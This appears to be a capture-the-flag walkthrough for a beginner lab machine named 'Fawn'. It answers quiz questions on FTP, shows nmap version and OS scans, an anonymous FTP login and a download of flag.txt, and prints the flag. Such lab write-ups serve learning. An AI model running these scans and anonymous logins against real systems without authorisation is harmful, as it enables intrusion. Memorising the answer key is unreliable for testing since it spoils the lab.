# Fawn

- **Category**: Starting Point - Tier 0
- **Difficulty**: Very Easy
- **Tags**: FTP, Network, Protocols, Reconnaissance, Anonymous/Guest Access
- **Tools**: Nmap, Telnet


# Walkthrough

## Task 1: What does the 3-letter acronym FTP stand for?

> **Answer**: File Transfer Protocol

## Task 2: Which port does the FTP service listen on usually?

> **Answer**: 21

## Task 3: What acronym is used for the secure version of FTP?

> **Answer**: SFTP

## Task 4: What is the command we can use to send an ICMP echo request to test our connection to the target?

> **Answer**: ping

## Task 5: From your scans, what version is FTP running on the target?

We can use the `-sV` flag in `nmap` to probe for the service/version info.

- `nmap -sV -p 21 10.129.57.230`


```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-01 15:37 AEST
Nmap scan report for 10.129.57.230
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```


> **Answer**: vsftpd 3.0.3

## Task 6: From your scans, what OS type is running on the target?

`nmap` has the ability to attempt to detect the Operating System of the target with the `-O` flag. We can provide the port with `-p 21` to save some time because we know that port is open.

**Note** that this requires root privileges

- `sudo nmap -O -p 21 10.129.57.230`

> **Answer**: Unix

## Task 7: What is the command we need to run in order to display the 'ftp' client help menu?

> **Answer**: ftp -h

## Task 8: What is username that is used over FTP when you want to log in without having an account?

> **Answer**: anonymous

## Task 9: What is the response code we get for the FTP message 'Login successful'?

> **Answer**: 230

## Task 10: There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.

> **Answer**: ls

## Task 11: What is the command used to download the file we found on the FTP server?

> **Answer**: get

# Submit root flag

Putting together what we've learnt from the last few tasks, we can now FTP into the target server with the `anonymous` user, find the flag, download it, and then read it.


```
> ftp 10.129.57.230
Connected to 10.129.57.230.
220 (vsFTPd 3.0.3)
Name (10.129.57.230:josh): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||65518|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||10748|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*******************************************************************************************************************************|    32      726.74 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.10 KiB/s)
ftp> exit
221 Goodbye.

> cat flag.txt
035db21c881520061c53e0536e44f815

```

> **Answer**: 035db21c881520061c53e0536e44f815


